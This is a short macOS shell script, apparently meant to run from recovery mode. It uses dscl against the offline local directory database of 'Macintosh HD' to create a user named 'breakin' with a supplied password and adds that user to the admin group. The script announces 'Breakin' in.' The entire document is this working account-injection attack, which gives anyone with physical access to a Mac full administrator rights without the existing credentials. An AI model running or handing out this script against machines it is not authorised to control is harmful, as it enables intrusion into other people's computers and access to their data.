#!/bin/sh
echo "Breakin' in."
DSCL_DB="/Volumes/Macintosh HD/var/db/dslocal/nodes/Default"
USERNAME="breakin"
PASSWORD=$1
USERID="101"
GROUPID="20"

dscl -f "$DSCL_DB" localonly -create /Local/Target/Users/$USERNAME
dscl -f "$DSCL_DB" localonly -create /Local/Target/Users/$USERNAME UserShell /bin/zsh
dscl -f "$DSCL_DB" localonly -create /Local/Target/Users/$USERNAME RealName $USERNAME
dscl -f "$DSCL_DB" localonly -create /Local/Target/Users/$USERNAME UniqueID $USERID
dscl -f "$DSCL_DB" localonly -create /Local/Target/Users/$USERNAME PrimaryGroupID $GROUPID
dscl -f "$DSCL_DB" localonly -create /Local/Target/Users/$USERNAME NFSHomeDirectory /Users/$USERNAME
dscl -f "$DSCL_DB" localonly -passwd /Local/Target/Users/$USERNAME "$PASSWORD"
dscl -f "$DSCL_DB" localonly -append /Local/Target/Groups/admin GroupMembership $USERNAME
echo "Done."